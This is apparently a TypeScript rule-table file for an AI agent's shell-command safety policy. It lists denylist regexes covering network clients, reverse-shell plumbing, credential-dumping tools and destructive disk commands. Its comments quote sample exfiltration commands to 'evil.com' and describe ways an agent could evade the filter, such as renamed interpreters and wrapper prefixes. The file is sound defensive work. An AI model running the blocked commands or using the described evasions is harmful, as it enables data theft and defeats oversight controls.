// Static rule tables for the shell-command policy. Pure data: command
// denylist regexes, the browser-open detector, and the argv[0] interpreter /
// network-client basename sets. Consumed by shell-detectors.ts and
// shell-policy.ts; no logic lives here.

// Destructive `rm` (a -f or -r flag; catches split flags like `rm -a -f`).
// NOT in BLOCKED_COMMANDS: it is handled explicitly and MODE-AWARE by
// evaluateShellCommand — blocked outright in workspace/common mode, but in
// unrestricted mode allowed on the user's own files with only the catastrophic
// floor (catastrophic-paths.ts) held. A blanket denylist entry here would
// re-block it regardless of mode, which is exactly the bug this splits out.
export const RM_DESTRUCTIVE_FLAGS = /\brm\s+.*(-[a-zA-Z]*f|-[a-zA-Z]*r)\b/i;

// Raw-text patterns over the whole command line: network egress, and the
// shapes that are not a command word (redirects, continuations, phrases).
// Everything that IS a command word is an argv rule in
// shell-command-rule-table.ts, which reads the command being run.
export const BLOCKED_COMMANDS = [
  // Network exfil via pipe
  /\bcurl\b.*\|/i,
  /\bwget\b.*\|/i,
  // ── Shell-as-exfiltration: best-effort denylist of network clients ──
  // These can send data to arbitrary hosts, bypassing all HTTP/SSRF controls.
  // The agent should use http_request (which has SSRF checks, DNS pinning,
  // content wrapping, and audit logging) instead of raw shell network tools.
  // This is a BEST-EFFORT denylist, not an exhaustive wall — the structural
  // answer is the argv[0] allowlist; this chunk hardens the denylist with the
  // common clients. New/renamed binaries can still slip a denylist.
  // `(?<!\.)` keeps a dotfile out of it: `ls -la ~/.ssh 2>&1` names a
  // directory, not the client (blocked live on 2026-09-28 as "uses ssh").
  /(?<!\.)\bcurl\s/i,                       // curl (any use)
  /(?<!\.)\bwget\s/i,                       // wget (any use)
  /(?<!\.)\bnc\s/i,                         // netcat
  /(?<!\.)\bncat\s/i,                       // nmap netcat
  /(?<!\.)\bsocat\s/i,                      // socat
  /(?<!\.)\btelnet\s/i,                     // telnet
  /(?<!\.)\bssh\s/i,                        // ssh (outbound)
  /(?<!\.)\bscp\s/i,                        // scp
  /(?<!\.)\bsftp\s/i,                       // sftp
  /(?<!\.)\brsync\s/i,                      // rsync
  /(?<!\.)\bftp\s/i,                        // ftp
  /(?<!\.)\baria2c\s/i,                     // aria2c download utility
  /(?<!\.)\btftp\s/i,                       // trivial FTP client
  // ── R4-12: additional network / dual-use binaries (denylist STOPGAP) ──
  // openssl present on every dev box gives a clean raw-TLS pipe
  // (`openssl s_client -connect h:443 < secrets`), websocat is a pure network
  // tool, and the mail senders relay to arbitrary destinations. This is a
  // userland denylist, NOT a sound wall — the durable fix is the planned
  // OS-level sandbox (Landlock / sandbox-exec). New/renamed binaries still slip.
  /(?<!\.)\bwebsocat\s/i,                   // websocat (network-only WebSocket client)
  /(?<!\.)\bnc\.traditional\s/i,            // Debian netcat-traditional (the bare `\bnc\s` misses the dotted name)
  /(?<!\.)\bsendmail\s/i,                   // sendmail (relay mail to arbitrary dest)
  /(?<!\.)\bssmtp\s/i,                      // ssmtp (relay mail to arbitrary dest)
  // NOTE: `mail`/`mailx` moved to DANGEROUS_INVOKE_BINS (argv[0] check) — the
  // bare `\bword\s` form false-positived on arguments (`send mail to …`).
  /\bopenssl\s+s_(client|server)\b/i,       // openssl s_client/s_server ONLY (raw TLS pipe); bare openssl dgst/x509/enc/genrsa stay allowed
  // `fetch`, `http`, `https`, `xh`, `httpie`, `curlie` are deliberately NOT
  // listed here as `\bword\s` patterns: that would false-positive on
  // legitimate non-network commands (`git fetch`, `npm fetch`). They are
  // network clients ONLY as the leading argv[0], so detectNetworkClientArgv0()
  // below blocks them by command-leading basename instead (C3-12/C3-14, (e)).
  // ── DNS / automation / opener clients (egress that bypasses HTTP/SSRF) ──
  // These reach the network or hand a URL to another app (DNS-tunnel exfil,
  // browser-launch-as-exfil, AppleScript-wrapped shell). `\bword\s` requires
  // the binary be immediately followed by whitespace, so `open ` matches but
  // `openssl `/`/usr/bin/openfoo` do not.
  // NOTE: dig/host/nslookup/getent/ping/traceroute/open moved to
  // DANGEROUS_INVOKE_BINS (argv[0] check). As bare `\bword\s` substrings they
  // false-positived on benign arguments (`grep host /etc/hosts`, `… | grep
  // open`, `echo "ping the box"`). The danger is INVOKING them, which the
  // argv[0]-basename scan captures precisely without the false blocks.
  // ── Network use spelled inside a script body (PowerShell / .NET / Python) ──
  /Invoke-WebRequest\b/i,                   // PowerShell web
  /Invoke-RestMethod\b/i,                   // PowerShell REST
  /\bIwr\b/i,                               // PowerShell alias
  /\bIrm\b/i,                               // PowerShell alias
  /\bStart-BitsTransfer\b/i,               // PowerShell BITS
  /\bNet\.WebClient\b/i,                    // .NET web client
  /\bSystem\.Net\.Http/i,                   // .NET HTTP
  /\brequests\.(get|post|put|delete)\b/i,   // Python requests
  /\burllib\.(request|urlopen)\b/i,         // Python urllib
  /\bhttpx?\./i,                            // Python httpx
  /\baiohttp\b/i,                           // Python aiohttp
  // ── Shell escape / injection edge cases ──
  // fd-redirect onto a NON-standard descriptor (>=3): the io-duplication a
  // reverse shell uses to wire stdio onto a pre-opened socket fd (`>&5`, `<&3`,
  // `2>&7`). The socket OPEN itself is caught by the /dev/tcp + `exec N<>` rules
  // below. Benign std-stream merges (2>&1, 1>&2, >&2) target fd 0-2 — they can't
  // reach the network and are the ubiquitous output-capture idiom — so the
  // narrowed pattern leaves them ALLOWED (the bare /\d+>&\d/ blocked 2>&1, which
  // starved every verify command that captured stderr).
  /[<>]&(?:[3-9]|\d{2,})/,                  // fd redirect to fd>=3 (<&3, >&5, 2>&10)
  /\\\n/,                                   // backslash-newline continuation (multi-line escape)
  // ── Reverse-shell plumbing ──
  /(^|[\s<>&|=])\/dev\/(tcp|udp)\//i,        // bash /dev/tcp|/dev/udp socket (reverse shell / exfil); boundary-char guard hits spaced AND glued redirects without false-firing on path/dev/tcpdump
  /\bexec\s+\d+<>/i,                        // fd exec redirect (reverse shell)
  /\bnohup\b.*&$/i,                          // background persistent process
  // ── Additional network exfiltration vectors ──
  /\bdnscat\b/i,                             // DNS tunnel
  /\bchisel\b/i,                             // TCP tunnel
  // ── Credential access ──
  /\bcredential\s+manager/i,                 // Windows credential manager
];

// The command-line forms of these are argv rules now (shell-command-rule-table.ts),
// which read the command being run instead of matching its words anywhere. Inside
// an inline PROGRAM (`python -c "…"`, `node -e "…"`, an awk program) the text is
// code, not a command line, so matching the words is the only check there is, and
// these patterns keep that coverage exactly as the command-line list gave it.
export const INLINE_CODE_PATTERNS: readonly RegExp[] = [
  /\bsudo\b/i,
  /\bchmod\s+777\b/i,
  /\bmkfs\b/i,
  /\bdd\s+.*of=/i,
  /(?<!-)\bformat\b\s+(\/|\\|[A-Za-z]:)/i,
  /(?<![\w./\\-])eval\b/i,
  /\bperl\s+-e\b/i,
  /\bruby\s+-e\b/i,
  /\bphp\s+-r\b/i,
  /\bbase64\s+(-[a-zA-Z]*d|--decode)\b/i,
  /\bpowershell\b.*-enc/i,
  /\bnet\s+user\b/i,
  /\breg\s+(add|delete|query|export|import|save|restore|load|unload)\b/i,
  /\bwmic\b/i,
  /\bschtasks\b/i,
  /\|.*\b(bash|sh|cmd|powershell)\b/i,
  /\bosascript\s/i,
  /\bxdg-open\s/i,
  /\blaunchctl\b/i,
  /\bautomator\b/i,
  /\bshortcuts\s/i,
  /\bosacompile\b/i,
  /\bdefaults\s+write\b.*Launch(Agents|Daemons)/i,
  /^\.\s+\//,
  /\bsource\s+\//i,
  /\bbash\s+-i\b/i,
  /\bsh\s+-i\b/i,
  /\bzsh\s+-i\b/i,
  /\bpython[23]?\s+-i\b/i,
  /\bnode\s+--inspect/i,
  /\bmkfifo\b/i,
  /\bscreen\s+-[dD]/i,
  /\btmux\s+new/i,
  /\bxterm\b.*-e/i,
  /\bpython[23]?\s+-m\s+http\.server\b/i,
  /\bpython[23]?\s+-m\s+smtpd\b/i,
  /\bphp\s+-S\b/i,
  /\bnpx\s+serve\b/i,
  /\bmimikatz\b/i,
  /\bhashdump\b/i,
  /\bsecurity\s+find-generic-password/i,
  /\bfdisk\b/i,
  /\bparted\b/i,
];

// ── argv[0] dangerous-command basenames ──
// Network/DNS/opener/disk binaries that are dangerous when INVOKED, but whose
// bare names are common English/argument words. Matching them as substrings
// (the old `\bopen\s`/`\bhost\s`/`\bping\s` BLOCKED_COMMANDS entries) blocked
// benign commands like `grep host /etc/hosts` or `… | grep open`. They are now
// detected by the argv[0] basename of each pipe segment (detectDangerousInvokeBin),
// the same structural approach as NETWORK_CLIENT_BINS: `grep host` (host as an
// argument) passes; `host evil.com` / `cat x | mail a@evil` (the binary as the
// invoked command) is blocked. The rarer-word network clients (curl/wget/nc/…)
// deliberately stay as substring patterns above — they almost never appear as a
// benign argument, so the broader match is extra coverage, not a false-positive
// source.
export const DANGEROUS_INVOKE_BINS = new Set([
  "open", "host", "ping", "mount", "umount",
  "mail", "mailx", "dig", "nslookup", "getent", "traceroute",
]);

// Commands that hand a URL to the system browser / an external app. Rejected
// with a specific "use the browser tool instead" message (which has CDP
// attach, audit logging, and no system-app launch). Lives here — not inline in
// bashTool — so EVERY bash-spawning path (bash, process_start, process_restart)
// inherits it. Covers the cross-platform openers: start/open/xdg-open/explorer
// with an http(s):// or www. target, plus the PowerShell/rundll32 idioms.
// NOTE: no trailing `\b` here. A trailing `\b` anchored on `https?:` never
// matched a real URL — `:` → `/` in `https://…` is non-word→non-word, so there
// is no word boundary, and the inline copy this replaced silently failed to
// block `open https://…` (only `open https:foo`). The leading `\b` is what
// prevents substring false-positives; the branch contents anchor the rest.
export const BROWSER_OPEN_CMDS =
  /\b(start\s+(https?:|www\.|"?https?:)|explorer\s+(https?:|"?https?:)|open\s+(https?:|"?https?:)|xdg-open\s+(https?:|"?https?:)|sensible-browser|wslview\s|powershell.*Start-Process.*https?:|rundll32\s+url\.dll)/i;

// ── C3-13: argv-aware interpreter-escape detection ──
// argv[0] basenames that run an inline-eval body via `-e`/`-E`/`-r` flags.
export const INTERP_ESCAPE_BINS = new Set(["perl", "ruby", "php"]);

// ── R4-11/R4-13: inline-eval interpreter-escape refusal (non-unrestricted) ──
// A regex denylist over a Turing-complete interpreter body cannot soundly
// classify what `node -e`/`python -c` will do (R4-11), and keying the existing
// escape detectors on a basename SPELLING set lets a renamed interpreter
// (`./myperl -e`, `cp /usr/bin/perl ./py && ./py -e`) slip past (R4-13). The
// sound class-level fix is to REFUSE the inline-eval interpreter FORM in
// common/workspace modes (unrestricted stays permissive) and make the agent
// write a path-guard-visible script file instead. No capability is removed.
//
// Per-interpreter eval flags: argv[0] basename → the flag tokens that make it
// evaluate an inline body. CRITICAL: `-c` is an eval flag ONLY for python — for
// sh/bash/zsh/dash, `-c '...'` is the NORMAL shell form (the shell tool itself
// spawns `bash -c`), so those shells are deliberately absent here and stay
// ALLOWED.
export const INTERP_EVAL_FLAGS: Record<string, Set<string>> = {
  python: new Set(["-c"]),
  python3: new Set(["-c"]),
  // perl: -e/-E eval; -n/-p wrap an implicit loop but still require an -e body,
  // and the argv-aware short-flag scan in detectInterpreterEscape already walks
  // clustered forms (`-ne`), so the eval signal here is -e/-E.
  perl: new Set(["-e", "-E"]),
  ruby: new Set(["-e"]),
  php: new Set(["-r"]),
  node: new Set(["-e", "-p", "--eval", "--print"]),
  deno: new Set(["-e", "--eval"]),
  bun: new Set(["-e", "-p", "--eval", "--print"]),
};

// The rename-escape (part b) flag set: any eval-style flag that, paired with a
// model-writable-path argv[0], marks a renamed interpreter. Legit workspace
// executables (`./node_modules/.bin/tsc`, `./build/app`) are not invoked with
// `-e '<code>'`, so this targets the rename-escape without breaking dev flows.
export const RENAME_ESCAPE_EVAL_FLAGS = new Set([
  "-e", "-E", "-r", "-c", "-p", "--eval", "--print",
]);

// ── C3-12/C3-14: network-client argv[0] denylist ──
// `fetch`/`http`/`https`/`xh`/`httpie`/`curlie` are network clients ONLY when
// they LEAD the command — `git fetch`/`npm fetch` are not. So gate them by the
// argv[0] basename of each pipe segment, never as a substring (spec (e)).
export const NETWORK_CLIENT_BINS = new Set([
  "fetch", "http", "https", "xh", "httpie", "curlie",
]);

// ── argv[0] resolution: leading tokens to skip to find the REAL command ──
// A network/dangerous binary can sit at tokens[1+] behind a shell KEYWORD
// (`then dig …`, `do host …`) or a command-modifier WRAPPER (`env dig …`,
// `time xh …`, `timeout 5 dig …`, `xargs dig …`). The argv[0] scans strip
// these prefixes — and a wrapper's own option/number/VAR=val args — to reach
// the real command word. This matters because the argv[0]-only bins
// (dig/host/nslookup/getent/traceroute/mail + the NETWORK_CLIENT_BINS) have NO
// raw-string denylist backstop the way curl/wget/nc do, so once separators are
// relaxed under a confined backend, a leading keyword/wrapper would otherwise
// let them evade (`if true; then dig evil.com; fi`).
export const SHELL_KEYWORD_PREFIXES = new Set(["then", "do", "else", "elif"]);
export const SHELL_WRAPPER_PREFIXES = new Set([
  "env", "command", "exec", "time", "timeout", "nice", "ionice",
  "nohup", "setsid", "stdbuf", "xargs", "sudo", "doas",
]);

// Per-wrapper SHORT options that take a DETACHED value token (`xargs -I {}`,
// `env -u NAME`, `timeout -s TERM`, `nice -n 10`, `stdbuf -o L`). Without this,
// resolveRealArgv0 would return the value ({}, NAME, TERM, 10, L) as the argv[0]
// and the real bin at the following token would hide. Only consulted for the
// EXACT `-X` form (a glued `-I{}` / `-n10` / `-oL` carries its own value, and a
// `-x=v` form is self-contained), so a value-taking flag never eats a real
// command word. Wrappers absent here (command/exec/nohup/setsid/sudo/doas) take
// no detached values.
export const WRAPPER_VALUE_OPTIONS: Record<string, Set<string>> = {
  xargs: new Set(["-I", "-i", "-a", "-E", "-e", "-L", "-l", "-n", "-P", "-s", "-d"]),
  env: new Set(["-u", "-C", "-S"]),
  timeout: new Set(["-s", "-k"]),
  nice: new Set(["-n"]),
  ionice: new Set(["-c", "-n", "-p"]),
  stdbuf: new Set(["-i", "-o", "-e"]),
  time: new Set(["-o", "-f"]),
};
